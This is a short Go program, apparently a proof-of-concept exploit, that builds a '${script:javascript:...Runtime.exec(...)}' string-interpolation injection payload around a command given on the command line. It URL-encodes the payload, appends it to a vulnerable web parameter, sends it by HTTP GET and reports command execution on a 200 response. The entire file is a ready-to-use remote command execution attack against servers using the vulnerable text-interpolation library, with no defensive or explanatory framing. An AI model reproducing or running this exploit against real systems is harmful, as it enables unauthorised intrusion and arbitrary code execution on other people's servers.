package main

import (
	"fmt"
	"net/http"
	"net/url"
	"os"
)

func craftPayload() string {
	_url := "http://" + os.Args[1]
	payload := url.QueryEscape("${script:javascript:java.lang.Runtime.getRuntime().exec('" + os.Args[2] + "')}") // One Ugly Payload
	_url += payload
	return _url
}

func main() {

	if len(os.Args) != 3 {
		fmt.Fprintf(os.Stderr, "[-] Usage: ./program vulnerable/web?param= 'ls -la'\n")
		os.Exit(2)
	}

	payload := craftPayload()

	res, err := http.Get(payload)

	if err != nil {
		fmt.Printf("[-] HTTP request failed: %s\n", err)
		os.Exit(1)
	}

	if res.StatusCode != 200 {
		fmt.Fprintf(os.Stderr, "[-] Status code error: != 200\n")
		os.Exit(1)
	}

	fmt.Printf("[+] Command execution success\n")
}
